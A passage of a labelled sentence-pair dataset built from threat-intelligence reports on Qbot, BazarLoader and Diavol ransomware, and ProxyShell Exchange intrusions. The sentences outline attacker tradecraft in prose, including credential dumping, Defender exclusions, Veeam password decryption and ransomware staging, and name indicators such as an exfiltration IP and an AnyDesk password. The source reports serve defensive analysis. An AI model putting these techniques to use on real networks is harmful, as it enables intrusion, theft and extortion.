        "relation": "ELABORATION"
    },
    {
        "S1": "Around the same time, LSASS was access by Qbot to collect credentials from memory.",
        "S2": "Thirty minutes after initial access, Qbot was observed collecting data from the beachhead host including browser data and emails from Outlook.",
        "relation": "NEXT"
    },
    {
        "S1": "Thirty minutes after initial access, Qbot was observed collecting data from the beachhead host including browser data and emails from Outlook.",
        "S2": "At around 50 minutes into the infection, the beachhead host copied a Qbot dll to an adjacent workstation, which was then executed by remotely creating a service.",
        "relation": "NEXT"
    },
    {
        "S1": "At around 50 minutes into the infection, the beachhead host copied a Qbot dll to an adjacent workstation, which was then executed by remotely creating a service.",
        "S2": "Minutes later, the beachhead host did the same thing to another adjacent workstation and then another, and before we knew it, all workstations in the environment were compromised.",
        "relation": "NEXT"
    },
    {
        "S1": "Minutes later, the beachhead host did the same thing to another adjacent workstation and then another, and before we knew it, all workstations in the environment were compromised.",
        "S2": "Qbot followed it\u2019s normal process on each machine.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Qbot followed it\u2019s normal process on each machine.",
        "S2": "Servers were not accessed in this intrusion.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Servers were not accessed in this intrusion.",
        "S2": "After this activity, normal beaconing occurred but no further actions on objectives were seen.",
        "relation": "MISC"
    },
    {
        "S1": "After this activity, normal beaconing occurred but no further actions on objectives were seen.",
        "S2": "We assess with medium to high confidence that the QBot infection was delivered to the system via a malspam campaign through a hidden 4.0 Macro\u2019s in Excel.",
        "relation": "MISC"
    },
    {
        "S1": "We assess with medium to high confidence that the QBot infection was delivered to the system via a malspam campaign through a hidden 4.0 Macro\u2019s in Excel.",
        "S2": "We believe this is the xls file that lead to the Qbot infection, due to the overlap in time period, download url, and file name.",
        "relation": "NEXT"
    },
    {
        "S1": "We believe this is the xls file that lead to the Qbot infection, due to the overlap in time period, download url, and file name.",
        "S2": "The QBot dll was executed on the system and shortly after, injected into the msra.exe process.",
        "relation": "NEXT"
    },
    {
        "S1": "The QBot dll was executed on the system and shortly after, injected into the msra.exe process.",
        "S2": "A scheduled task was created by Qbot to escalate to SYSTEM privileges.",
        "relation": "NEXT"
    },
    {
        "S1": "A scheduled task was created by Qbot to escalate to SYSTEM privileges.",
        "S2": "This scheduled task was created by the msra.exe process, to be run only once, a few minutes after its creation.",
        "relation": "NEXT"
    },
    {
        "S1": "This scheduled task was created by the msra.exe process, to be run only once, a few minutes after its creation.",
        "S2": "QBot was observed injecting into msra.exe process on multiple systems.",
        "relation": "NEXT"
    },
    {
        "S1": "QBot was observed injecting into msra.exe process on multiple systems.",
        "S2": "Multiple folders were added to the Windows Defender Exclusions list in order to prevent the Qbot dll placed inside of it from being detected.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Multiple folders were added to the Windows Defender Exclusions list in order to prevent the Qbot dll placed inside of it from being detected.",
        "S2": "The newly dropped dll was then executed and process injected into msra.exe.",
        "relation": "NEXT"
    },
    {
        "S1": "The newly dropped dll was then executed and process injected into msra.exe.",
        "S2": "Qbot used reg.exe to add Defender folder exceptions for folders within AppData and ProgramData.",
        "relation": "MISC"
    },
    {
        "S1": "Qbot used reg.exe to add Defender folder exceptions for folders within AppData and ProgramData.",
        "S2": "dll files dropped by Qbot, were deleted after injection into msra.exe.",
        "relation": "MISC"
    },
    {
        "S1": "dll files dropped by Qbot, were deleted after injection into msra.exe.",
        "S2": "LSASS was accessed by Qbot, with the intention of accessing credentials.",
        "relation": "MISC"
    },
    {
        "S1": "LSASS was accessed by Qbot, with the intention of accessing credentials.",
        "S2": "This can be observed through the Sysmon process access event, indicating the GrantedAccess value of 0x1410 .",
        "relation": "ELABORATION"
    },
    {
        "S1": "This can be observed through the Sysmon process access event, indicating the GrantedAccess value of 0x1410 .",
        "S2": "Additional evidence of LSASS access was visible in API calls from Qbot injected processes to LSASS.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Additional evidence of LSASS access was visible in API calls from Qbot injected processes to LSASS.",
        "S2": "The following discovery commands where observed coming from the Qbot processes.",
        "relation": "MISC"
    },
    {
        "S1": "The following discovery commands where observed coming from the Qbot processes.",
        "S2": "These commands where executed on the beachhead system along with other workstations compromised through lateral movement.",
        "relation": "ELABORATION"
    },
    {
        "S1": "These commands where executed on the beachhead system along with other workstations compromised through lateral movement.",
        "S2": "Qbot moved laterally to all workstations in the environment by copying a dll to the machine and then remotely creating a service to execute the Qbot dll.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Qbot moved laterally to all workstations in the environment by copying a dll to the machine and then remotely creating a service to execute the Qbot dll.",
        "S2": "The services created had the DeleteFlag set causing the service to be removed upon reboot.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The services created had the DeleteFlag set causing the service to be removed upon reboot.",
        "S2": "The following occurred on each workstation:",
        "relation": "MISC"
    },
    {
        "S1": "The following occurred on each workstation:",
        "S2": "The lateral movement activity from the beachhead host was rapid and connections were seen across all workstations in the network.",
        "relation": "MISC"
    },
    {
        "S1": "The lateral movement activity from the beachhead host was rapid and connections were seen across all workstations in the network.",
        "S2": "A view from the memory of the beachhead host shows the injected msra process connecting to hosts across the network.",
        "relation": "MISC"
    },
    {
        "S1": "A view from the memory of the beachhead host shows the injected msra process connecting to hosts across the network.",
        "S2": "The service creations were also observed via event id 7045 across all hosts.",
        "relation": "MISC"
    },
    {
        "S1": "The service creations were also observed via event id 7045 across all hosts.",
        "S2": "Qbot is widely known to steal emails with the intention of collecting information and performing email thread hijacking.",
        "relation": "MISC"
    },
    {
        "S1": "Qbot is widely known to steal emails with the intention of collecting information and performing email thread hijacking.",
        "S2": "Email data will be collected and stored in 1 of 2 locations.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Email data will be collected and stored in 1 of 2 locations.",
        "S2": "Once exfiltrated from the system this folder is then deleted as seen below",
        "relation": "NEXT"
    },
    {
        "S1": "Once exfiltrated from the system this folder is then deleted as seen below",
        "S2": "Collection of browser data from Internet Explorer and Microsoft Edge was also observed with Qbot using the built-in utility esentutl.exe.",
        "relation": "MISC"
    },
    {
        "S1": "Collection of browser data from Internet Explorer and Microsoft Edge was also observed with Qbot using the built-in utility esentutl.exe.",
        "S2": "Qbot uses a tiered infrastructure, often using other compromised systems as first tier proxy points for establishing a constantly changing list of C2 endpoints.",
        "relation": "MISC"
    },
    {
        "S1": "Qbot uses a tiered infrastructure, often using other compromised systems as first tier proxy points for establishing a constantly changing list of C2 endpoints.",
        "S2": "You can review a in-depth analysis of the modules of this malware in this Checkpoint report.",
        "relation": "ELABORATION"
    },
    {
        "S1": "You can review a in-depth analysis of the modules of this malware in this Checkpoint report.",
        "S2": "With this type of setup the list of C2 from October 2021, has in large rotated out of use.",
        "relation": "MISC"
    },
    {
        "S1": "With this type of setup the list of C2 from October 2021, has in large rotated out of use.",
        "S2": "To keep up to date on current Qbot C2 endpoints you can check out our Threat Feed & All Intel service as we track these changing lists daily.",
        "relation": "ELABORATION"
    },
    {
        "S1": "To keep up to date on current Qbot C2 endpoints you can check out our Threat Feed & All Intel service as we track these changing lists daily.",
        "S2": "Qbot does use SSL in it\u2019s C2 communication but does not rely soley on port 443 for communication, in the case investigated here the following ports were found in the extracted C2 configuration.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Qbot does use SSL in it\u2019s C2 communication but does not rely soley on port 443 for communication, in the case investigated here the following ports were found in the extracted C2 configuration.",
        "S2": "Qbot uses SSL and while the domains do not resolve, they follow a pattern and are detectable with several Suricata ETPRO signatures.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Qbot uses SSL and while the domains do not resolve, they follow a pattern and are detectable with several Suricata ETPRO signatures.",
        "S2": "The final actions of the threat actor were not observed, however, the data exfiltrated from the network could be used to conduct further attacks or sold to 3rd parties.",
        "relation": "NEXT"
    },
    {
        "S1": "The malware (BazarLoader) was delivered to an endpoint via email, which included a link to OneDrive.",
        "S2": "The OneDrive link, directed the user to download a file that was a zip, which included an ISO inside.",
        "relation": "NEXT"
    },
    {
        "S1": "The OneDrive link, directed the user to download a file that was a zip, which included an ISO inside.",
        "S2": "Once opened (mounted) on the users system, it was determined the ISO contained a LNK file and a DLL.",
        "relation": "NEXT"
    },
    {
        "S1": "Once opened (mounted) on the users system, it was determined the ISO contained a LNK file and a DLL.",
        "S2": "The LNK file masqueraded as a Document enticing the user to click/open it.",
        "relation": "NEXT"
    },
    {
        "S1": "The LNK file masqueraded as a Document enticing the user to click/open it.",
        "S2": "Once the user executed the LNK file, the BazarLoader infection was initiated.",
        "relation": "NEXT"
    },
    {
        "S1": "Once the user executed the LNK file, the BazarLoader infection was initiated.",
        "S2": "As seen in previous cases, the BazarLoader infection began with internal reconnaissance of the environment using Windows utilities such as net, nltest, and ipconfig.",
        "relation": "NEXT"
    },
    {
        "S1": "As seen in previous cases, the BazarLoader infection began with internal reconnaissance of the environment using Windows utilities such as net, nltest, and ipconfig.",
        "S2": "After being inactive for one hour, the intrusion continued with dropping of multiple Cobalt Strike beacon DLL\u2019s on the beachhead.",
        "relation": "NEXT"
    },
    {
        "S1": "After being inactive for one hour, the intrusion continued with dropping of multiple Cobalt Strike beacon DLL\u2019s on the beachhead.",
        "S2": "This was followed by another round of discovery from the compromised machine.",
        "relation": "NEXT"
    },
    {
        "S1": "This was followed by another round of discovery from the compromised machine.",
        "S2": "The threat actor then proceeded with execution of adf.bat, which is a script that queries various Active Directory objects using the AdFind tool.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor then proceeded with execution of adf.bat, which is a script that queries various Active Directory objects using the AdFind tool.",
        "S2": "The first run was using a renamed binary named qq.exe and then the threat actor later dropped a properly named AdFind binary and executed the same discovery commands again.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The first run was using a renamed binary named qq.exe and then the threat actor later dropped a properly named AdFind binary and executed the same discovery commands again.",
        "S2": "Soon after that, with the use of another simple batch script named fodhelper_reg_hashes.bat, they performed credentials acquisition via dumping of SAM, SECURITY and SYSTEM registry hives.",
        "relation": "NEXT"
    },
    {
        "S1": "Soon after that, with the use of another simple batch script named fodhelper_reg_hashes.bat, they performed credentials acquisition via dumping of SAM, SECURITY and SYSTEM registry hives.",
        "S2": "Returning after a gap of almost 18 hours, the threat actor performed another round of network scanning from the beachhead.",
        "relation": "NEXT"
    },
    {
        "S1": "Returning after a gap of almost 18 hours, the threat actor performed another round of network scanning from the beachhead.",
        "S2": "This was then followed by attempts to Kerberoast and \u201cAS-REProast\u201d using the tool Rubeus.",
        "relation": "NEXT"
    },
    {
        "S1": "This was then followed by attempts to Kerberoast and \u201cAS-REProast\u201d using the tool Rubeus.",
        "S2": "The threat actor then moved laterally via RDP to a server that contained file shares.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor then moved laterally via RDP to a server that contained file shares.",
        "S2": "After gaining access to the system they installed a remote access application, AnyDesk, as well as Filezilla.",
        "relation": "NEXT"
    },
    {
        "S1": "After gaining access to the system they installed a remote access application, AnyDesk, as well as Filezilla.",
        "S2": "The threat actors used FileZilla to exfiltrate data out of the environment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors used FileZilla to exfiltrate data out of the environment.",
        "S2": "They then pivoted towards critical systems, such as domain controllers and a server that held backups.",
        "relation": "NEXT"
    },
    {
        "S1": "They then pivoted towards critical systems, such as domain controllers and a server that held backups.",
        "S2": "The threat actor then dumped LSASS from one of the domain controllers, using task manager, and then uploaded the dump file to ufile.io using Internet Explorer.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor then dumped LSASS from one of the domain controllers, using task manager, and then uploaded the dump file to ufile.io using Internet Explorer.",
        "S2": "On the backup server, the threat actors attempted to dump databases associated with the backup solution.",
        "relation": "LIST"
    },
    {
        "S1": "On the backup server, the threat actors attempted to dump databases associated with the backup solution.",
        "S2": "In one attempt, they used a documented technique to recover the encoded password and decode it using the Microsoft Data Protection API (DPAPI).",
        "relation": "MISC"
    },
    {
        "S1": "In one attempt, they used a documented technique to recover the encoded password and decode it using the Microsoft Data Protection API (DPAPI).",
        "S2": "After around 42 hours post initial intrusion, the threat actors pushed towards completion of their final objective.",
        "relation": "NEXT"
    },
    {
        "S1": "After around 42 hours post initial intrusion, the threat actors pushed towards completion of their final objective.",
        "S2": "RDP access was established from the central file server that the threat actors had compromised to all endpoints and a batch script named \u201ckill.bat\u201d was executed on all of the targeted machines.",
        "relation": "MISC"
    },
    {
        "S1": "RDP access was established from the central file server that the threat actors had compromised to all endpoints and a batch script named \u201ckill.bat\u201d was executed on all of the targeted machines.",
        "S2": "The script consists of commands that removes Volume Shadow copies, disables Windows automatic startup repair, and stops all the running services on the host.",
        "relation": "NEXT"
    },
    {
        "S1": "The script consists of commands that removes Volume Shadow copies, disables Windows automatic startup repair, and stops all the running services on the host.",
        "S2": "Once the script completed execution, the Diavol Ransomware was deployed via the RDP connection on each machine by running the executable manually.",
        "relation": "NEXT"
    },
    {
        "S1": "Once the script completed execution, the Diavol Ransomware was deployed via the RDP connection on each machine by running the executable manually.",
        "S2": "From initial access, to ransomware deployment, the threat actors took about 42 hours to deploy ransomware domain wide, but from the login on the third day, to the last host ransom execution, only about an hour passed for the actors to finish their deployment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "From initial access, to ransomware deployment, the threat actors took about 42 hours to deploy ransomware domain wide, but from the login on the third day, to the last host ransom execution, only about an hour passed for the actors to finish their deployment.",
        "S2": "Initial access was via a OneDrive link that arrived via malicious emails that was reported via @ankit_anubhav.",
        "relation": "MISC"
    },
    {
        "S1": "Initial access was via a OneDrive link that arrived via malicious emails that was reported via @ankit_anubhav.",
        "S2": "Upon accessing the link, a zip file was downloaded.",
        "relation": "NEXT"
    },
    {
        "S1": "Upon accessing the link, a zip file was downloaded.",
        "S2": "The original URL of the file can be traced from the file stream log data (Sysmon Event ID 15) as well.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The original URL of the file can be traced from the file stream log data (Sysmon Event ID 15) as well.",
        "S2": "Reviewing the file stream data from Sysmon we can see that the zip contains an ISO file.",
        "relation": "MISC"
    },
    {
        "S1": "Reviewing the file stream data from Sysmon we can see that the zip contains an ISO file.",
        "S2": "TheAnalyst reported similar BazarLoader activity via malicious emails around the same time frame.",
        "relation": "MISC"
    },
    {
        "S1": "TheAnalyst reported similar BazarLoader activity via malicious emails around the same time frame.",
        "S2": "The BazarLoader ISO downloaded from the OneDrive link, consists of a malicious DLL and shortcut file named \u201cDocuments.lnk\u201d which executes the DLL via rundll32.exe.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The BazarLoader ISO downloaded from the OneDrive link, consists of a malicious DLL and shortcut file named \u201cDocuments.lnk\u201d which executes the DLL via rundll32.exe.",
        "S2": "LNK File",
        "relation": "MISC"
    },
    {
        "S1": "LNK File",
        "S2": "After the initial execution, the malware contacted two of its C2 IPs:",
        "relation": "MISC"
    },
    {
        "S1": "After the initial execution, the malware contacted two of its C2 IPs:",
        "S2": "We then observed threat actors dropping multiple Cobalt Strike Beacon DLL\u2019s on the host in the following file paths:",
        "relation": "NEXT"
    },
    {
        "S1": "We then observed threat actors dropping multiple Cobalt Strike Beacon DLL\u2019s on the host in the following file paths:",
        "S2": "A new BITS job, named \u201cMicrosoft Office Manager upgrade v24.24\u201d was created on the beachhead host.",
        "relation": "NEXT"
    },
    {
        "S1": "A new BITS job, named \u201cMicrosoft Office Manager upgrade v24.24\u201d was created on the beachhead host.",
        "S2": "The BITS job failed because the requested URL does not exist.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The BITS job failed because the requested URL does not exist.",
        "S2": "While reporting failure in the logs, the BITS job did re-execute the mounted ISO files every 3 hours, for the length of the intrusion on the beachhead host.",
        "relation": "ELABORATION"
    },
    {
        "S1": "While reporting failure in the logs, the BITS job did re-execute the mounted ISO files every 3 hours, for the length of the intrusion on the beachhead host.",
        "S2": "After the threat actor moved laterally, we observed them installing Anydesk on multiple clients to create additional means of keeping access.",
        "relation": "NEXT"
    },
    {
        "S1": "After the threat actor moved laterally, we observed them installing Anydesk on multiple clients to create additional means of keeping access.",
        "S2": "They used PowerShell and cmd to automate the download and installation of AnyDesk.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They used PowerShell and cmd to automate the download and installation of AnyDesk.",
        "S2": "In order to install Anydesk for unattended access you have to set a password.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In order to install Anydesk for unattended access you have to set a password.",
        "S2": "The password here was set to J9kzQ2Y0qO",
        "relation": "ELABORATION"
    },
    {
        "S1": "The password here was set to J9kzQ2Y0qO",
        "S2": "The threat actor not only leaked their password when installing AnyDesk, but they also temporarily copied the password to the machine as the name of a text file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actor not only leaked their password when installing AnyDesk, but they also temporarily copied the password to the machine as the name of a text file.",
        "S2": "This password also matches one from the leaked Conti manuals back in August.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This password also matches one from the leaked Conti manuals back in August.",
        "S2": "From the Anydesk logs, we can also see the Client-ID and the IP used to access the clients.",
        "relation": "MISC"
    },
    {
        "S1": "From the Anydesk logs, we can also see the Client-ID and the IP used to access the clients.",
        "S2": "Logs can be found at %programdata%\\AnyDesk\\ad_svc.trace",
        "relation": "ELABORATION"
    },
    {
        "S1": "Logs can be found at %programdata%\\AnyDesk\\ad_svc.trace",
        "S2": "The threat actors made use of process injection through-out the intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors made use of process injection through-out the intrusion.",
        "S2": "The BazaLoader malware injected into an Edge browser process, as observed by the discovery activity, and Cobalt Strike DLL\u2019s activity.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The BazaLoader malware injected into an Edge browser process, as observed by the discovery activity, and Cobalt Strike DLL\u2019s activity.",
        "S2": "Cobalt Strike processes were also observed injecting into various other processes.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Cobalt Strike processes were also observed injecting into various other processes.",
        "S2": "Threat actors performed dumping of SAM, SECURITY and SYSTEM registry hives using a batch script named \u201cfodhelper_reg_hashes.bat\u201d.",
        "relation": "MISC"
    },
    {
        "S1": "Threat actors performed dumping of SAM, SECURITY and SYSTEM registry hives using a batch script named \u201cfodhelper_reg_hashes.bat\u201d.",
        "S2": "Contents of fodhelper_reg_hashes.bat are as follows:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Contents of fodhelper_reg_hashes.bat are as follows:",
        "S2": "They also performed enumeration of the web browser information using more.",
        "relation": "MISC"
    },
    {
        "S1": "They also performed enumeration of the web browser information using more.",
        "S2": "The following files were accessed:",
        "relation": "LIST"
    },
    {
        "S1": "The following files were accessed:",
        "S2": "Using a well known technique documented on the Veeam backup forum, the threat actor managed to decrypt passwords used by Veeam.",
        "relation": "MISC"
    },
    {
        "S1": "Using a well known technique documented on the Veeam backup forum, the threat actor managed to decrypt passwords used by Veeam.",
        "S2": "The encryption method used by Veeam is Data Protection API/DPAPI.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The encryption method used by Veeam is Data Protection API/DPAPI.",
        "S2": "All the activity was done using RDP on the server with backups.",
        "relation": "MISC"
    },
    {
        "S1": "All the activity was done using RDP on the server with backups.",
        "S2": "Dump the credentials using sqlcmd.exe to base64 passwords.",
        "relation": "MISC"
    },
    {
        "S1": "Dump the credentials using sqlcmd.exe to base64 passwords.",
        "S2": "Via RDP and notepad, they created a new file containing the code for the decryption routine.",
        "relation": "MISC"
    },
    {
        "S1": "Via RDP and notepad, they created a new file containing the code for the decryption routine.",
        "S2": "Execute, which gave the threat actors passwords that were used by Veeam.",
        "relation": "MISC"
    },
    {
        "S1": "Execute, which gave the threat actors passwords that were used by Veeam.",
        "S2": "We also observed the threat actor using Rubeus to kerberoast and asreproast the environment.",
        "relation": "MISC"
    },
    {
        "S1": "We also observed the threat actor using Rubeus to kerberoast and asreproast the environment.",
        "S2": "BazaLoader was observed executing the well known battery of Windows discovery commands around 10 minutes after execution on the beachhead host.",
        "relation": "MISC"
    },
    {
        "S1": "BazaLoader was observed executing the well known battery of Windows discovery commands around 10 minutes after execution on the beachhead host.",
        "S2": "Shortly after the Cobalt Strike beacon was executed, we can see that they uploaded and ran the well known script adf.bat.",
        "relation": "MISC"
    },
    {
        "S1": "Shortly after the Cobalt Strike beacon was executed, we can see that they uploaded and ran the well known script adf.bat.",
        "S2": "This has been observed multiple times by different ransomware groups.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This has been observed multiple times by different ransomware groups.",
        "S2": "The threat actor ran AdFind twice, once using adf.bat file with AdFind renamed to qq.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor ran AdFind twice, once using adf.bat file with AdFind renamed to qq.",
        "S2": "The second time, they copy/pasted commands from adf.bat and executed them with AdFind.exe.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The second time, they copy/pasted commands from adf.bat and executed them with AdFind.exe.",
        "S2": "On the second day, the following commands were executed before they started working on moving laterally in the domain.",
        "relation": "MISC"
    },
    {
        "S1": "On the second day, the following commands were executed before they started working on moving laterally in the domain.",
        "S2": "During the course of the intrusion, we observed execution of the utility \u201cAdvanced IP Scanner\u201d to perform network scanning (over ports 21,80,445,4899,8080).",
        "relation": "MISC"
    },
    {
        "S1": "During the course of the intrusion, we observed execution of the utility \u201cAdvanced IP Scanner\u201d to perform network scanning (over ports 21,80,445,4899,8080).",
        "S2": "Advanced IP Scanner was downloaded using Internet Explorer on a server:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Advanced IP Scanner was downloaded using Internet Explorer on a server:",
        "S2": "and then run with the portable option:",
        "relation": "NEXT"
    },
    {
        "S1": "and then run with the portable option:",
        "S2": "We also saw \u201cMSSQLUDPScanner.exe\u201d used for discovery of MSSQL instances across the environment.",
        "relation": "MISC"
    },
    {
        "S1": "We also saw \u201cMSSQLUDPScanner.exe\u201d used for discovery of MSSQL instances across the environment.",
        "S2": "We believe the tool used is rvrsh3ll\u2019s MSSQLUDPScanner",
        "relation": "ELABORATION"
    },
    {
        "S1": "We believe the tool used is rvrsh3ll\u2019s MSSQLUDPScanner",
        "S2": "Comparing compiled version to executable from this intrusion",
        "relation": "MISC"
    },
    {
        "S1": "Comparing compiled version to executable from this intrusion",
        "S2": "Before execution of AdFind.exe, adf.bat was run.",
        "relation": "MISC"
    },
    {
        "S1": "Before execution of AdFind.exe, adf.bat was run.",
        "S2": "Via RDP they manually ran @carlos_perez\u2018s Invoke-Sharefinder.ps1 on a server.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Via RDP they manually ran @carlos_perez\u2018s Invoke-Sharefinder.ps1 on a server.",
        "S2": "It then looks like they manually copied the output to a file named shares.txt.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It then looks like they manually copied the output to a file named shares.txt.",
        "S2": "After each RDP connection to a server on the second day, the threat actor also made sure to open up task manager to review running processes and possibly logged in users on these systems.",
        "relation": "MISC"
    },
    {
        "S1": "After each RDP connection to a server on the second day, the threat actor also made sure to open up task manager to review running processes and possibly logged in users on these systems.",
        "S2": "We observed the threat actor using RDP as their main tool to do lateral movement in the environment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We observed the threat actor using RDP as their main tool to do lateral movement in the environment.",
        "S2": "Most likely using credentials gathered through dumping of either lsass, or the registry hives.",
        "relation": "MISC"
    },
    {
        "S1": "Most likely using credentials gathered through dumping of either lsass, or the registry hives.",
        "S2": "The first instance was through the beachhead where they used Cobalt Strike as a reverse proxy.",
        "relation": "MISC"
    },
    {
        "S1": "The first instance was through the beachhead where they used Cobalt Strike as a reverse proxy.",
        "S2": "This also revealed their Workstation Name which is WIN-799RI0TSTOF.",
        "relation": "MISC"
    },
    {
        "S1": "This also revealed their Workstation Name which is WIN-799RI0TSTOF.",
        "S2": "After they installed AnyDesk, they used that access to RDP to other servers in the environment as well as eventually executing their final objective using this access.",
        "relation": "MISC"
    },
    {
        "S1": "After they installed AnyDesk, they used that access to RDP to other servers in the environment as well as eventually executing their final objective using this access.",
        "S2": "The threat actors attempted to dump a database using sqlcmd.exe but the connection to the MSSQL server failed.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors attempted to dump a database using sqlcmd.exe but the connection to the MSSQL server failed.",
        "S2": "Command and Control",
        "relation": "MISC"
    },
    {
        "S1": "Command and Control",
        "S2": "BazarLoader:",
        "relation": "MISC"
    },
    {
        "S1": "BazarLoader:",
        "S2": "On the second day of the intrusion, FileZilla was installed on one of the servers which used SFTP to exfiltrate data to a remote computer at IP address 192.52.167.210.",
        "relation": "MISC"
    },
    {
        "S1": "On the second day of the intrusion, FileZilla was installed on one of the servers which used SFTP to exfiltrate data to a remote computer at IP address 192.52.167.210.",
        "S2": "Using Netflow, we were able to confirm that some amount of data (~200MB) was exfiltrated out of the environment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Using Netflow, we were able to confirm that some amount of data (~200MB) was exfiltrated out of the environment.",
        "S2": "Here we can see the threat actor actively exfiltrating our information using FileZilla.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Here we can see the threat actor actively exfiltrating our information using FileZilla.",
        "S2": "We also saw the threat actors exfiltrate databases by dragging and dropping information into FileZilla.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We also saw the threat actors exfiltrate databases by dragging and dropping information into FileZilla.",
        "S2": "After pivoting to a Domain Controller, the threat actors dumped lsass using Task Manager:",
        "relation": "MISC"
    },
    {
        "S1": "After pivoting to a Domain Controller, the threat actors dumped lsass using Task Manager:",
        "S2": "And then uploaded the dump file to ufile.io using Internet Explorer on a server.",
        "relation": "NEXT"
    },
    {
        "S1": "And then uploaded the dump file to ufile.io using Internet Explorer on a server.",
        "S2": "Eyes on Apple iOS 14.6",
        "relation": "MISC"
    },
    {
        "S1": "Eyes on Apple iOS 14.6",
        "S2": "On the third day, the threat actors began their final actions.",
        "relation": "MISC"
    },
    {
        "S1": "On the third day, the threat actors began their final actions.",
        "S2": "The final actions took place from a compromised file server.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The final actions took place from a compromised file server.",
        "S2": "They began with a ping sweep to locate all live hosts.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They began with a ping sweep to locate all live hosts.",
        "S2": "After that completed, they reviewed the results on the host.",
        "relation": "NEXT"
    },
    {
        "S1": "After that completed, they reviewed the results on the host.",
        "S2": "From a file server, the threat actors then established RDP connections to all the machines in the environment.",
        "relation": "NEXT"
    },
    {
        "S1": "From a file server, the threat actors then established RDP connections to all the machines in the environment.",
        "S2": "The threat actors transferred 2 files onto the machines they connected to.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors transferred 2 files onto the machines they connected to.",
        "S2": "A batch script named kill.bat and a ransomware executable CryptoLocker64.exe.",
        "relation": "NEXT"
    },
    {
        "S1": "A batch script named kill.bat and a ransomware executable CryptoLocker64.exe.",
        "S2": "The batch script is responsible for deletion of volume shadow copies, turning off automatic repairs and stopping all the running services on the host.",
        "relation": "NEXT"
    },
    {
        "S1": "The batch script is responsible for deletion of volume shadow copies, turning off automatic repairs and stopping all the running services on the host.",
        "S2": "Some of the commands are as follows:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Some of the commands are as follows:",
        "S2": "After completion of this activity, the ransomware binary was executed manually over the RDP connections.",
        "relation": "NEXT"
    },
    {
        "S1": "After completion of this activity, the ransomware binary was executed manually over the RDP connections.",
        "S2": "From the threat actors starting their ping sweep, to final host encryption, about an hour passed leaving behind the ransom note for the organization to find.",
        "relation": "ELABORATION"
    },
    {
        "S1": "From the threat actors starting their ping sweep, to final host encryption, about an hour passed leaving behind the ransom note for the organization to find.",
        "S2": "The threat actors went from initial access to domain wide ransomware in just under two days.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We observed an intrusion where an adversary exploited multiple Exchange vulnerabilities (ProxyShell) to drop multiple web shells.",
        "S2": "Over the course of three days, three different web shells were dropped in publicly accessible directories.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Over the course of three days, three different web shells were dropped in publicly accessible directories.",
        "S2": "These web shells, exposed to the internet, were used to execute arbitrary code on the Microsoft Exchange Server utilizing PowerShell and cmd.",
        "relation": "ELABORATION"
    },
    {
        "S1": "These web shells, exposed to the internet, were used to execute arbitrary code on the Microsoft Exchange Server utilizing PowerShell and cmd.",
        "S2": "After gaining an initial foothold on the Exchange system, the threat actors started discovery by executing commands like ipconfig, net, ping, systeminfo, and others, using the previously dropped web shells.",
        "relation": "NEXT"
    },
    {
        "S1": "After gaining an initial foothold on the Exchange system, the threat actors started discovery by executing commands like ipconfig, net, ping, systeminfo, and others, using the previously dropped web shells.",
        "S2": "This battery of initial discovery included a network call out to themoscowtimes[.]com.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This battery of initial discovery included a network call out to themoscowtimes[.]com.",
        "S2": "The threat actors repeated these tests twice over the first two days.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors repeated these tests twice over the first two days.",
        "S2": "On the third day, the next phase of the intrusion was underway.",
        "relation": "NEXT"
    },
    {
        "S1": "On the third day, the next phase of the intrusion was underway.",
        "S2": "Since the commands executed via the web shell run with SYSTEM level privileges, threat actors took advantage of this and enabled a built-in account DefaultAccount, set the password and added it to Administrator and Remote Desktop Users groups.",
        "relation": "NEXT"
    },
    {
        "S1": "Since the commands executed via the web shell run with SYSTEM level privileges, threat actors took advantage of this and enabled a built-in account DefaultAccount, set the password and added it to Administrator and Remote Desktop Users groups.",
        "S2": "The threat actors then dropped Plink and established an SSH tunnel to expose RDP over the tunnel.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors then dropped Plink and established an SSH tunnel to expose RDP over the tunnel.",
        "S2": "They then connected to the Exchange server over RDP using the DefaultAccount account.",
        "relation": "NEXT"
    },
    {
        "S1": "They then connected to the Exchange server over RDP using the DefaultAccount account.",
